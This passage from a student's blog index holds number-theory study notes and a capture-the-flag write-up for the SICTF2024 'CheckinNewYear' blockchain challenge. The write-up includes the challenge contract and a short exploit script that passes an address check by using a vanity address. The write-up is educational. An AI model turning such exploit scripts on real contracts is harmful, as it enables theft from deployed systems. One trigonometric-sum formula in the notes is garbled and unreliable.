a_{\alpha+h}<br>$$<br>而当α＜β时我们有<br>$$<br>\frac{a}{b}&#x3D;0.a_1…a_\beta \dot a_{\beta+1}…\dot a_{\beta+h}<br>$$</p><h2 id="第七章-连分数和数论分数"><a href="#第七章-连分数和数论分数" class="headerlink" title="第七章 连分数和数论分数"></a>第七章 连分数和数论分数</h2><h3 id="连分数"><a href="#连分数" class="headerlink" title="连分数"></a>连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240302235054370.png" alt="image-20240302235054370"></p><p>当1≤k≤n是一个整数时，我们把[a1,a2,…,ak]&#x3D;pk&#x2F;qk叫做(22)的第k个渐进分数。</p><h3 id="一些结论-4"><a href="#一些结论-4" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h4><p>设n≥3和连分数[a1,a2,…an]的渐进分数是p1&#x2F;q1,p2&#x2F;q2,…,pn&#x2F;qn,则在这些剪辑分数之间，下面的关系式成立<br>$$<br>p_1&#x3D;a_1,q_1&#x3D;1,p_2&#x3D;a_1a_2+1,q_2&#x3D;a_2<br>$$<br>而当3≤k≤n时，则有<br>$$<br>p_k&#x3D;a_kp_{k-1}+p_{k-2},q_k&#x3D;a_kq_{k-1}+q_{k-2}<br>$$</p><h4 id="2-4"><a href="#2-4" class="headerlink" title="2"></a>2</h4><p>如果连分数[a1,a2,…,an]的n个渐进分数是pk&#x2F;qk（其中k&#x3D;1,2,…,n），则当k≥2时我们有<br>$$<br>p_kq_{k-1}-p_{k-1}q_k&#x3D;(-1)^k<br>$$<br>而当k≥3时我们有<br>$$<br>p_kq_{k-2}-p_{k-2}q_k&#x3D;(-1)^{k-1}a_k<br>$$</p><h4 id="3-4"><a href="#3-4" class="headerlink" title="3"></a>3</h4><p>每一个有理数都能够表示成为有限连分数</p><h4 id="4-3"><a href="#4-3" class="headerlink" title="4"></a>4</h4><p>设[a1,a2,…,an…]是一个无限连分数，pk&#x2F;qk(k&#x3D;1,2,…)是它的第k个渐进分数，则当k≥2时我们有<br>$$<br>\frac{p_{2(k-1)}}{q_{2(k-1)}}&gt;\frac{p_{2k}}{q_{2k}},\frac{p_{2k-1}}{q_{2k-1}}&gt;\frac{p_{2k-3}}{q_{2k-3}},\frac{p_{2k}}{q_{2k}}&gt;\frac{p_{2k-1}}{q_{2k-1}}<br>$$</p><p>当k→∞时，pk&#x2F;qk有一极限，则我们有<br>$$<br>\frac{p_1}{q_1}&lt;\frac{p_3}{q_3}&lt;\frac{p_5}{q_5}&lt;…&lt;[a_1,a_2,…,a_n…]&lt;…&lt;\frac{p_6}{q_6}&lt;\frac{p_4}{q_4}&lt;\frac{p_2}{q_2}<br>$$</p><h3 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h3><p>设x是任何一个实数，我们用[x]来表示不大于x的最大整数，我们用{x}表示x-[x]</p><p>有如下性质：</p><p>(1) x&#x3D;[x]+{x},x-1&lt;[x]≤x</p><p>(2) 当n是一个整数时，我们有[n+x]&#x3D;n+[x]</p><p>(3) 当0≤x&lt;1时，有[x]&#x3D;0</p><h3 id="循环连分数"><a href="#循环连分数" class="headerlink" title="循环连分数"></a>循环连分数</h3><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303145246724.png" alt="image-20240303145246724"></p><h3 id="x-x-的一些性质"><a href="#x-x-的一些性质" class="headerlink" title="[x],{x}的一些性质"></a>[x],{x}的一些性质</h3><h4 id="1-5"><a href="#1-5" class="headerlink" title="1"></a>1</h4><p>$$<br>[x]+[y]\leq [x+y],{x}+{y}\geq {x+y}<br>$$</p><p>$$<br>[-x]&#x3D;\begin{cases} -[x]+1, 当x不是整数时 \ -[x], 当x是整数时 \end{cases}<br>$$</p><h4 id="2-5"><a href="#2-5" class="headerlink" title="2"></a>2</h4><p>设n是任一个正整数而α是一个实数时，则有<br>$$<br>[\alpha]+[\alpha+\frac{1}{n}]+…+[\alpha+\frac{n-1}{n}]&#x3D;[n\alpha]<br>$$<br>成立</p><h4 id="3-5"><a href="#3-5" class="headerlink" title="3"></a>3</h4><p>设a,b是两个整数，b&gt;0，则有<br>$$<br>a&#x3D;b[\frac{a}{b}]+b{\frac{a}{b}},0\leq b{\frac{a}{b}}\leq b-1<br>$$</p><h4 id="4-4"><a href="#4-4" class="headerlink" title="4"></a>4</h4><p>我们有<br>$$<br>[2x]+[2y]\geq [x]+[y]+[x+y]<br>$$</p><h3 id="一些数论函数"><a href="#一些数论函数" class="headerlink" title="一些数论函数"></a>一些数论函数</h3><p>除了前面提到过的欧拉函数和取整函数以外，我们还有一些数论函数</p><h4 id="除数函数"><a href="#除数函数" class="headerlink" title="除数函数"></a>除数函数</h4><p>如果n是一个正整数，我们用d(n)来表示n的因数的个数。我们把d(n)叫做除数函数。</p><h5 id="1-6"><a href="#1-6" class="headerlink" title="1"></a>1</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm都是不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>d(n)&#x3D;(\alpha_1+1)…(\alpha_m+1)<br>$$</p><h5 id="2-6"><a href="#2-6" class="headerlink" title="2"></a>2</h5><p>设a,b是两个正整数而gcd(a,b)&#x3D;1，则我们有<br>$$<br>d(ab)&#x3D;d(a)d(b)<br>$$</p><h4 id="因数和"><a href="#因数和" class="headerlink" title="因数和"></a>因数和</h4><p>如果n是一个正整数，则我们把n的所有因数相加以后所得到的和叫做n的因数和，记作σ(n)</p><h5 id="1-7"><a href="#1-7" class="headerlink" title="1"></a>1</h5><p>设m,n是两个正整数且gcd(m,n)&#x3D;1，则我们有<br>$$<br>\sigma (mn)&#x3D;\sigma(m)\cdot\sigma(n)<br>$$</p><h4 id="真因数"><a href="#真因数" class="headerlink" title="真因数"></a>真因数</h4><p>如果n是一个正整数，则我们把除去n本身以外的n的因数都叫作n的真因数</p><h4 id="完全数"><a href="#完全数" class="headerlink" title="完全数"></a>完全数</h4><p>如果n是一个正整数，当我们把n的所有真因数相加以后，所得到的和恰好等于n时，则我们把n叫作完全数。或者说当σ(n)&#x3D;2n成立时，则我们把n叫作完全数。</p><h5 id="1-8"><a href="#1-8" class="headerlink" title="1"></a>1</h5><p>如果n是一个≥2的整数而2^n-1是一个素数，则<br>$$<br>2^{n-1}(2^n-1)<br>$$<br>是一个完全数</p><h4 id="σ和d的联系"><a href="#σ和d的联系" class="headerlink" title="σ和d的联系"></a>σ和d的联系</h4><p>如果n是一个正整数而λ是一个非负整数，则令<br>$$<br>\sigma_\lambda(n)&#x3D;\sum_{d|n}d^\lambda<br>$$<br>设m是一个整数，令m^0&#x3D;1，我们有<br>$$<br>\sigma_0(n)&#x3D;d(n)<br>$$<br>另外<br>$$<br>\sigma_1(n)&#x3D;\sigma(n)<br>$$</p><h4 id="莫比乌斯函数"><a href="#莫比乌斯函数" class="headerlink" title="莫比乌斯函数"></a>莫比乌斯函数</h4><p>$$<br>\mu(n)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ (-1)^r,当n是r个不同的素数的乘积时 \ 0,当n能被一个素数的平方除尽时\end{cases}<br>$$</p><h5 id="1-9"><a href="#1-9" class="headerlink" title="1"></a>1</h5><p>如果m,n是两个正整数而gcd(m,n)&#x3D;1，则我们有<br>$$<br>\mu(mn)&#x3D;\mu(m)\cdot\mu(n)<br>$$</p><h5 id="2-7"><a href="#2-7" class="headerlink" title="2"></a>2</h5><p>我们有<br>$$<br>\sum_{d|n}\mu(d)&#x3D;\begin{cases} 1,当n&#x3D;1时 \ 0,当n&gt;1时\end{cases}<br>$$</p><h5 id="3-6"><a href="#3-6" class="headerlink" title="3"></a>3</h5><p>设n&#x3D;p1^α1…pm^αm，其中p1,…pm是m个不同的素数，而α1,…,αm都是正整数，则我们有<br>$$<br>\sum_{d|n}|\mu(d)|&#x3D;2^m<br>$$</p><h2 id="第八章-关于复数和三角和的概念"><a href="#第八章-关于复数和三角和的概念" class="headerlink" title="第八章  关于复数和三角和的概念"></a>第八章  关于复数和三角和的概念</h2><h3 id="三角函数泰勒公式"><a href="#三角函数泰勒公式" class="headerlink" title="三角函数泰勒公式"></a>三角函数泰勒公式</h3><p>这里贴一下三角函数泰勒公式<img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175243666.png" alt="image-20240303175243666"></p><p><img src="/images/%E3%80%8A%E5%88%9D%E7%AD%89%E6%95%B0%E8%AE%BA%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240303175252488.png" alt="image-20240303175252488"></p><h3 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h3><p>$$<br>e^{i\theta}&#x3D;cos\theta+isin\theta<br>$$</p><p>并且由此可以推知，<br>$$<br>|e^{i\theta}|&#x3D;\sqrt{cos^2\theta+sin^2\theta}&#x3D;1<br>$$</p><h3 id="负数的指数式"><a href="#负数的指数式" class="headerlink" title="负数的指数式"></a>负数的指数式</h3><p>根据上面的欧拉公式，复数z&#x3D;r(cosθ+isinθ)可以表示为简单形式<br>$$<br>z&#x3D;re^{i\theta}<br>$$</p><h3 id="一些结论-5"><a href="#一些结论-5" class="headerlink" title="一些结论"></a>一些结论</h3><h4 id="1-10"><a href="#1-10" class="headerlink" title="1"></a>1</h4><p>设θ1和θ2是两个实数，则我们有<br>$$<br>e^{i(\theta_1+\theta_2)}&#x3D;e^{i\theta_1}\cdot e^{i\theta_2}<br>$$</p><h4 id="2-8"><a href="#2-8" class="headerlink" title="2"></a>2</h4><p>设n是一个正整数而z&#x3D;a+bi是一个复数，则当z≠1时我们有<br>$$<br>\sum_{m&#x3D;0}^n{z^m}&#x3D;\frac{1-z^{n+1}}{1-z}<br>$$</p><h4 id="3-7"><a href="#3-7" class="headerlink" title="3"></a>3</h4><p>我们有<br>$$<br>\sum_{m&#x3D;0}^{n-1}{e^{i(\theta+\frac{n-1}{2}\varphi)}}\cdot\frac{sin\frac{n\varphi}{2}}{sin\frac{\varphi}{2}}<br>$$<br>其中n是一个正整数，φ≠2lπ，其中l是任一个整数，即{φ&#x2F;2x}≠0</p><h2 id="（也许暂时的）结尾"><a href="#（也许暂时的）结尾" class="headerlink" title="（也许暂时的）结尾"></a>（也许暂时的）结尾</h2><p>以上是本人读了前两册《初等数论》后记录的笔记。第二册的三角和部分及最后一册暂且先不读了，以后有需要再读了做补充。</p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Academic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次上链</title>
      <link href="/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/"/>
      <url>/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>题目来源于SICTF2024 #Round 3 Blockchain方向的CheckinNewYear</p><p>当时这题没做出来，现在根据official writeup进行了一次复盘（</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><img src="/images/记第一次上链/屏幕截图 2024-02-22 235215.png" alt="屏幕截图 2024-02-22 235215" style="zoom:50%;" /><p>如何注册使用metamask这里不再赘述，remix IDE网站：<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>先生成一个deployer account:</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012955732.png" alt="image-20240223012955732"></p><p>按照要求给这个账户去水龙头接点水，不然就会无法支付2中部署合约时产生的费用</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013024832.png" alt="image-20240223013024832"></p><p>部署一下题目的智能合约，得到合约地址和token</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223013113909.png" alt="image-20240223013113909"></p><p>用4查看一下合约的源代码</p><img src="/images/记第一次上链/屏幕截图 2024-02-23 004703.png" alt="屏幕截图 2024-02-23 004703" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: shu shao de xiao mi di</span><br><span class="line">pragma solidity ^0.8.9;</span><br><span class="line">contract HappyNewYear&#123;</span><br><span class="line">    string private NewYear;</span><br><span class="line">    constructor(string memory _newyear )  &#123;</span><br><span class="line">        NewYear = _newyear;</span><br><span class="line">    &#125;</span><br><span class="line">    function happyNewYear(string memory _newYear) public payable &#123;</span><br><span class="line">        require(uint160(msg.sender) |</span><br><span class="line">        2**16 * 3**3 * 5 * 7 * 13 * 17 * 19 * 37 * 73 * 97 * 109 * 241 * 257 * 433 * 577 * 673 * 38737 * 487824887233 ==</span><br><span class="line">        2**2 * 17 * 67 * 733 * 316139 * 18992431891 * 72887484710091183279372959</span><br><span class="line">        ,&quot;Not this Year&quot;);</span><br><span class="line">        NewYear = _newYear;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">       function isSolved() public view returns (bool)&#123;</span><br><span class="line">        require(keccak256(abi.encodePacked(NewYear)) == keccak256(abi.encodePacked(&quot;Happy&quot;)),&quot;not HappyNewYear&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读一下代码逻辑，发现其中对用户的地址有限制。这里用两串较长的式子进行了简单的混淆，经过计算不难发现，这里的限制是要求用户地址的最后四位是2024。</p><p>在这里，official writeup中给出了一个可以专门用来生成指定形式地址的网站：<a href="https://vanity-eth.tk/">https://vanity-eth.tk/</a></p><blockquote><p>比赛期间做的时候就是卡在这里了，学长发了我exp.sol我都不会用。。。没想到其实有这么方便的网站~（T0T)</p></blockquote><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223183457544.png" alt="image-20240223183457544"></p><p>接下来只要给isSolved函数的NewYear值传一个”Happy”字符串就可以了</p><h2 id="python编写exp"><a href="#python编写exp" class="headerlink" title="python编写exp"></a>python编写exp</h2><p>官方给出的exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cheb3 <span class="keyword">import</span> Connection</span><br><span class="line"><span class="keyword">from</span> cheb3.utils <span class="keyword">import</span> compile_file</span><br><span class="line">entrant_abi, entrant_bytecode = compile_file(<span class="string">&quot;Example.sol&quot;</span>, <span class="string">&quot;HappyNewYear&quot;</span>,</span><br><span class="line"><span class="string">&quot;0.8.9&quot;</span>)[<span class="string">&#x27;HappyNewYear&#x27;</span>]  <span class="comment">#确保Example.sol跟这个py文件在同一路径下</span></span><br><span class="line">conn = Connection(<span class="string">&#x27;http://124.221.86.119:40002&#x27;</span>)</span><br><span class="line">existing_account =conn.account(<span class="string">&quot;...&quot;</span>)  <span class="comment">#这里是填写上面生成的账号的Private Key</span></span><br><span class="line">target_address = <span class="string">&quot;0x3C58Ec40D7E79BEf9c7987b7c5414b0B13CcEDEe&quot;</span>  <span class="comment">#合约地址</span></span><br><span class="line">entrant_contract = conn.contract(</span><br><span class="line">existing_account,</span><br><span class="line">address=target_address,</span><br><span class="line">abi=entrant_abi</span><br><span class="line">)</span><br><span class="line">entrant_contract.functions.happyNewYear(<span class="string">&quot;Happy&quot;</span>).send_transaction()</span><br></pre></td></tr></table></figure><p>成功运行以后只要去nc的3中查看即可</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p><h2 id="remix"><a href="#remix" class="headerlink" title="remix"></a>remix</h2><p>新进一个test.sol文件，把得到的合约源码复制进去</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010958373.png" alt="image-20240223010958373"></p><p>编译一下，注意compiler的版本，绿色的√出现即为编译成功</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223011101264.png" alt="image-20240223011101264"></p><p>在metamask上手动添加网络，网络名称随便写，RPC题目中的复制过来（记得加上http），链ID随便写，保存的时候它会教你做事，货币符号随便写</p><blockquote><p>由于之前做题的时候添加过了，这里有个报错</p></blockquote><img src="/images/记第一次上链/image-20240223011626597.png" alt="image-20240223011626597" style="zoom:50%;" /><p>在添加账户中导入账户，填写上面生成的账户的Private Key</p><img src="/images/记第一次上链/image-20240223011806125.png" alt="image-20240223011806125" style="zoom:50%;" /><p>开始将智能合约部署上链，ENVIRONMENT选Inject Provider - MetaMask，确保自己连入的是那个2024结尾的账户（点那个地球的标志查看），At Address填入合约地址，然后点一下At Address，给happyNewYear传一个Happy，然后点一下happyNewYear，确认交易，大功告成！</p><img src="/images/记第一次上链/image-20240223012042008.png" alt="image-20240223012042008" style="zoom:50%;" /><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223012345867.png" alt="image-20240223012345867"></p><img src="/images/记第一次上链/image-20240223012407277.png" alt="image-20240223012407277" style="zoom:50%;" /><p>nc一下查看3即可看到flag</p><p><img src="/images/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/image-20240223010429906.png" alt="image-20240223010429906"></p>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Academic </tag>
            
            <tag> Blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF2024 Round3 Writeup</title>
      <link href="/2024/02/19/SICTF2024-Writeup/"/>
      <url>/2024/02/19/SICTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/SICTF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“[签到]签到” and “WHO?WHO?WHO” in “Misc”, “[Game][Battle City]“ in “Reverse” ,and “Forensics” was written by <strong>f4k3r</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> SICTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGame2024 Writeup</title>
      <link href="/2024/02/06/HGame2024-Writeup/"/>
      <url>/2024/02/06/HGame2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/HGame2024_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> HGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF2024 Writeup</title>
      <link href="/2024/02/06/BeginCTF2024-Writeup/"/>
      <url>/2024/02/06/BeginCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/BeginCTF2024_Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2023 Writeup</title>
      <link href="/2024/01/24/NCTF2023-Writeup/"/>
      <url>/2024/01/24/NCTF2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/NCTF2023_Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>“Web” was written by <strong>wuming</strong></p><p>“Reverse” was written by <strong>fermata</strong></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023 Writeup</title>
      <link href="/2024/01/24/0xGame2023-Writeup/"/>
      <url>/2024/01/24/0xGame2023-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="Week1-Writeup"><a href="#Week1-Writeup" class="headerlink" title="Week1 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week1_Writeup.pdf">Week1 Writeup</a></h4><h4 id="Week2-Writeup"><a href="#Week2-Writeup" class="headerlink" title="Week2 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week2_Writeup.pdf">Week2 Writeup</a></h4><h4 id="Week3-Writeup"><a href="#Week3-Writeup" class="headerlink" title="Week3 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week3_Writeup.pdf">Week3 Writeup</a></h4><h4 id="Week4-Writeup"><a href="#Week4-Writeup" class="headerlink" title="Week4 Writeup"></a><a href="https://www.blog.st4rr.top/writeups/0xGame2023_Week4_Writeup.pdf">Week4 Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Hello, world!</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>在下St4rr。</p><p>目前南邮大二在读，网安新手。</p><p>一个CTF赛棍，misc手，略懂一点crypto。</p><p>已加入CTF战队X1cT34m和Polaris，给大佬们端茶。</p><p>努力学习中，争取不拖大佬们的后腿Orz。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Comment</title>
      <link href="/comment/index.html"/>
      <url>/comment/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
